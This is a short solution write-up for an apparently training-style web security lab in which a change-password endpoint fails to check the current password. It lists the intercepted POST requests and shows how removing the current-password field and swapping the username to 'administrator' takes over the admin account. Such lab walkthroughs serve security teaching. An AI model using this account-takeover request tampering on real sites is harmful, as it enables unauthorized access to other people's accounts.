# Weak isolation on dual-use endpoint — Practitioner

**Status:** Solved

---

## Goal

Exploit password change function that doesnt properly verify current password.

---

## Steps (simple & complete)

1. **Login as wiener**
   - Credentials: `wiener:peter`
   - Go to "My account"

2. **Test password change**
   - Intercept password change request:
```
   POST /my-account/change-password
   username=wiener&current-password=peter&new-password=test123&new-password-confirm=test123
```

3. **Remove current password**
   - Delete the `current-password` parameter:
```
   username=wiener&new-password=test123&new-password-confirm=test123
```
   - Still works!

4. **Change administrator password**
   - Modify username to administrator:
```
   username=administrator&new-password=hacked123&new-password-confirm=hacked123
```

5. **Login as admin**
   - Logout
   - Login: `administrator:hacked123`
   - Delete carlos
   - Lab solved! ✓

---

